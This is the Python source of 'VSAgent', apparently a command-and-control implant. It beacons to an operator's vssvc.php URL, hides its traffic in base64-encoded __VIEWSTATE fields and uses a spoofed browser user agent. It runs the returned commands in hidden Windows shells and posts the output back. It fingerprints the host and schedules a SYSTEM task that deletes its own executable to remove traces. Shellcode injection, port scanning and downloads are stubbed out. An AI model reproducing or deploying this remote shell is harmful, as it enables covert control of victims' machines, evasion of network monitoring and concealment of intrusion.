#!/usr/bin/env python

import sys
import os
import subprocess
import threading
import json
import urllib
import urllib2
import re
import time
import string
import base64
import socket
from datetime import datetime, timedelta


class CommandThread(object):

    def __init__(self, timeout=5, debug=False):
        self.cmd = ''
        self.process = None
        self.thread = None
        self.output = ''
        self.timeout = timeout
        self.shell = False
        self.debug = debug
        self.phandles = []
        
    def run(self, cmd):
    
        def execute_command():
          
            self.output = ''
            if sys.platform.startswith('win'):
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
            else:
                startupinfo = None
            try:
                self.process = subprocess.Popen(self.cmd,
                    shell=self.shell,
                    startupinfo=startupinfo,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE)
            except:
                raise
            (stdout,stderr) = self.process.communicate()
            if stdout: self.output += stdout[:-1]
            if stderr: self.output += stderr[:-1]
            
        if sys.platform.startswith('win') and self.exe_in_path(cmd):
          self.shell=False
        else:
          self.shell=True
        
        self.cmd = cmd
        if len(self.cmd) > 2048:
            raise Exception('Error: Command string longer than 2048 characters.')

        if self.debug:
            if self.shell:
                print '[*] Running shell command: %s (%d)' % (self.cmd, len(self.cmd))
            else:
                print '[*] Running non-shell command: %s (%d)' % (self.cmd, len(self.cmd))
                
        if self.shell:
            try:
                execute_command()
            except:
                raise
        else:
            try:
                self.thread = threading.Thread(target=execute_command)
                self.thread.start()
            except:
                raise
            self.thread.join(self.timeout)
            if self.thread.is_alive():
                self.phandles.append(self.process)
                return '[*] No stdout/stderr received within %d seconds, command [%s] thread detached' % \
                    (self.timeout, self.cmd.split()[0])
                        
        """
        Why does WMIC always put double carriage returns in
        the output!?  It shall not be!
        """
        if re.match(r'^wmic',self.cmd,re.IGNORECASE):
            self.output = re.sub(r'\r{2}','\r',self.output)
            
        return self.output

    def exe_in_path(self,cmd):
        rxp = re.compile(r'^(.+\.EXE).*$',re.IGNORECASE)
        m = rxp.match(cmd.lstrip())
        if m:
            program = m.group(1)
        else:
            program = cmd.lstrip().split()[0] + '.EXE'
    
        for path in os.environ["PATH"].split(os.pathsep):
            target = os.path.join(path, program)
            if os.path.exists(target) and os.access(target,os.X_OK):
                return True
        return False
    
    def kill_detached(self):
        output = ''
        for p in self.phandles:
            output += '[*] Sub-process PID [%d] terminated\n' % (p.pid)
            p.terminate()
        return output
    
    def set_timeout(self,timeout=5):
        self.timeout = timeout
        return self.timeout

        
class Agent(object):

    def __init__(self, url, agent, proxy=None, debug=False):
        self.agent = agent
        self.url = url
        self.debug = debug
        self.version = "504"
        self.useragent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        self.viewstate = None
        self.pattern = '__VIEWSTATE" value="([^"]*)"'
        self.kill = False
        self.prochandle = None
        self.proctimeout = 5
        self.interval = 10
        self.proxy = proxy
        self.starttime = datetime.now()
        self.command_thread = CommandThread(timeout=self.proctimeout,debug=self.debug)
        
    def __findme(self):
        import ctypes
        if not sys.platform.startswith('win'):
          raise Exception('Not Windows Platform')
        if ctypes.windll.shell32.IsUserAnAdmin() != 1:
          raise Exception('User is not Administrative')
        command = 'wmic process where processid="%d" get processid,parentprocessid,executablepath /format:list' % os.getpid()
        try:
          stdout = subprocess.Popen(command,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=False).communicate()[0]
        except (subprocess.OSError) as e:
          return e
        mypid = []
        for line in stdout.split('\n'):
          if re.match(r'^(ProcessId|ParentProcessId).+',line):
            mypid.append(int(line.split('=')[1]))
          elif re.match(r'^ExecutablePath.+',line):
            execpath=line.split('=')[1].rstrip('\r')
        launchdir = os.environ['TEMP'] + '\_MEI'+str(mypid[0])+'2'
        if not os.path.isdir(launchdir): launchdir = ''
        if re.match(r'.+python.exe$',execpath):
          return ['FAILED: Running as a script']
        ret = [execpath,launchdir,mypid]
        if self.debug: print '[*] findme() details: '+str(ret)
        return ret
       
       
    def schedule_delete_task(self,when):
        if not sys.platform.startswith('win'):
          raise Exception('Not Windows Platform')
        try:
          exepath,launchdir,pids = self.__findme()
        except Exception as e:
          raise
        future = (datetime.now() + timedelta(0,0,0,0,when)).strftime('%H:%M:%S')
        command = 'schtasks /create /f /tn vsaclean /ru system /st %s /sc once /tr  \
            "cmd.exe /c del /q /f \\"%s\\" & rd /s /q \\"%s\\""' \
			% (future,exepath,launchdir)
        if self.debug: print '[*] schtasks(): '+command
        result = ''
        try:
            proc = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result += proc.stdout.read()[:-1]
            result += proc.stderr.read()[:-1]
        except (subprocess.OSError) as e:
          raise
        return result
    
    def download_file(self,url,decoded_filename=None):
        return '[*] This is only available in the full version of VSAgent'
    
    def chdir(self,command):
        dir = command[2:256].strip()
        if len(dir) == 0:
            return '[*] %s' % (os.getcwd())
        dir = dir.replace('"','')
        dir = dir.replace("'",'')
        if sys.platform.startswith('win') and dir[0] == '%' and dir[-1] == '%':
            try:
                dir = os.getenv(dir.strip('%'))
            except Exception as e:
                return str(e)             
        try:
            dir = os.path.normpath(dir)
        except Exception as e:
            return str(e)
        try:
            os.chdir(dir)
            return '[*] New working directory is: %s' % (os.getcwd())
        except Exception as e:
            return str(e)
                          
    def run_command(self, command):
        result = ''
        # inject macro
        if command.lower().startswith('!inject'):
            return '[*] This is only available in the full version of VSAgent'        
        
        # connect macro
        elif command.lower().startswith('!connect'):
            return '[*] This is only available in the full version of VSAgent'
                
        # portscan macro
        elif command.lower().startswith('!portscan'):
            return '[*] This is only available in the full version of VSAgent'                
        # download macro
        elif command.lower().startswith('!download'):
            return '[*] This is only available in the full version of VSAgent'
                
        # base64 download macro
        elif command.lower().startswith('!b64download'):
            return '[*] This is only available in the full version of VSAgent'
                
        # purge macro
        elif command.lower().startswith('!purge'):
            return '[*] This is only available in the full version of VSAgent'
            
        # kill macro
        elif command.lower().startswith('!kill'):
            self.kill = True
            result = self.command_thread.kill_detached()
            result += '\n[*] Agent Killed!\n'
            
        # set command timeout macro
        elif command.lower().startswith('!timeout'):
            params = command.split()
            if len(params) > 1 and re.match(r'[0-9]{1,2}',params[1]):
                timeout = int(params[1])
                if timeout >= 4 and timeout <= 300:
                    self.proctimeout = self.command_thread.set_timeout(timeout)
                    result = '[*] Command output timeout set to %d seconds' % (timeout)
                else:
                    result = '[*] Usage: !timeout <4 - 300 seconds>'
            else:
                result = '[*] Usage: !timeout <4 - 300 seconds>'
                
        # status info
        elif command.lower().startswith('!status'):
            r_days = (datetime.now() - self.starttime).days
            r_hours, remainder = divmod((datetime.now() - self.starttime).seconds, 3600)
            r_mins, r_secs = divmod(remainder, 60)
            result = """
[+] VSAgent Version %s
[+] Start Time [%s], Uptime [%d days, %02d:%02d:%02d]
[+] User Agent  = %s
[+] Current Dir = %s
[+] interval    = %2d seconds. (time between POST requests)
[+] timeout     = %2d seconds. (wait time before non-shell process termination)
""" % (self.version, self.starttime, r_days, r_hours, r_mins, r_secs, \
    self.useragent, os.getcwd(), self.interval, self.proctimeout)
            if self.proctimeout == 0:
                result += '    [-] Non-Shell Windows processes will be detached!'
                
        # change dir
        elif command.lower().startswith('cd'):
            result = self.chdir(command)
            
        # pwd
        elif command.lower() == 'pwd':
            result = os.getcwd()
            
        # run command shell command
        else:
            try:
                result = self.command_thread.run(command)
            except Exception as e:
                result = str(e)
        if self.debug: print '[*] Command result:\n%s' % (result)
        return result

    def process_payload(self, in_payload):
        out_payload = {'agent': self.agent, 'commands': []}
        if in_payload:
            jsonstr = in_payload.decode('base64')
            jsonobj = json.loads(jsonstr)
            if self.debug: print '[*] Incoming viewstate payload (decoded):\n%s' % (repr(jsonobj))
            self.interval = jsonobj['interval']
            if jsonobj['commands']:
                for command in jsonobj['commands']:
                    cmd = command['command']
                    result = self.run_command(cmd)
                    sub_payload = {}
                    sub_payload['id'] = command['id']
                    sub_payload['result'] = result
                    out_payload['commands'].append(sub_payload)
            else:
                if self.debug: print '[*] No commands. Sleeping for %d seconds...' % (self.interval)
                time.sleep(self.interval)
        if self.debug: print '[*] Outgoing viewstate payload (decoded):\n%s' % (repr(out_payload))
        jsonstr = json.dumps(out_payload)
        return jsonstr.encode('base64')[:-1]

    def request(self, url, method='GET', payload={}):
        payload = urllib.urlencode(payload)
        headers = {}
        headers['User-Agent'] = self.useragent
        handlers = []
        if self.debug:
            handlers = [urllib2.HTTPHandler(debuglevel=1), urllib2.HTTPSHandler(debuglevel=1)]
        if self.proxy:
            http_proxy = urllib2.ProxyHandler({'http': self.proxy})
            https_proxy = urllib2.ProxyHandler({'https': self.proxy})
            handlers.append(http_proxy)
            handlers.append(https_proxy)
        opener = urllib2.build_opener(*handlers)
        urllib2.install_opener(opener)
        if method == 'GET':
            if payload: url = '%s?%s' % (url, payload)
            req = urllib2.Request(url, headers=headers)
        elif method == 'POST':
            req = urllib2.Request(url, data=payload, headers=headers)
        # no else statement, will crash if other method used
        try:
            resp = urllib2.urlopen(req)
        except (urllib2.HTTPError, urllib2.URLError) as e:
            resp = e
        return resp

    def poll(self, viewstate):
        payload = {}
        payload['__VIEWSTATE'] = viewstate
        if self.debug: print '[*] Poll payload (encoded):\n%s' % (repr(payload))
        resp = self.request(url=self.url, method='POST', payload=payload)
        if resp.code == 200:
            content = resp.read()
        else:
            if self.debug: print '[!] Connection error: %s' % (resp.__str__())
            time.sleep(self.interval)
            content = ''
        return content

    def run(self):
        content = ''
        while True:
            payload = re.search(self.pattern, content).group(1) if re.search(self.pattern, content) else None
            viewstate = self.process_payload(payload)
            content = self.poll(viewstate)
            if self.kill: break
            if self.debug: print '[*] Poll response (raw):\n%s' % (content)
            
def sysname():    
    import uuid
    mac = str(uuid.uuid1()).split('-')[-1]
    mac = ':'.join([mac[i:i+2] for i in range(0, len(mac), 2)])
    if not sys.platform.startswith('win'):
      return mac
    command = "wmic nicconfig where 'ipenabled=true' get dnsdomain /format:list"
    try:
      stdout = subprocess.Popen(command,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=True).communicate()[0]
    except:
      return mac
    for line in stdout.split('\n'):
      if re.match(r'^DNSDomain.+',line):
        domain = line.split('=')[1].rstrip('\r')
    name = '%s (%s)' % (mac, domain)
    return name

def valid_ipaddr(ip):
    ot='([0-9]|[1-9][0-9]|1[0-9]{1,2}|2[0-4][0-9]|25[0-5])'
    rxp = re.compile(r'^%s\.%s\.%s\.%s$' % (ot,ot,ot,ot))
    if rxp.match(ip):
        return True
    return False

def tcp_portscan(host):
    return '[*] This is only available in the full version of VSAgent'
    
def tcp_connect(host, port, timeout=1):
    return '[*] This is only available in the full version of VSAgent'

def inject_shellcode(shellcode):
    return '[*] This is only available in the full version of VSAgent'

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--inject':
        print '[*] This is only available in the full version of VSAgent'
    elif len(sys.argv) > 1 and sys.argv[1] == '--connect':
        print '[*] This is only available in the full version of VSAgent'
    elif len(sys.argv) > 1 and sys.argv[1] == '--portscan':
        print '[*] This is only available in the full version of VSAgent'
    elif len(sys.argv) > 1 and sys.argv[1] == '--proxy':
        print '[*] This is only available in the full version of VSAgent'
    elif len(sys.argv) > 1 and 'vssvc.php' in sys.argv[1]:
        x = Agent(sys.argv[1], sysname())
        if "--debug" in sys.argv:
            x.debug = True
        try:
            x.run()
        except:
            pass
    else:
        print "Please provide the URL of vssvc.php as the first argument."
    sys.exit(0)
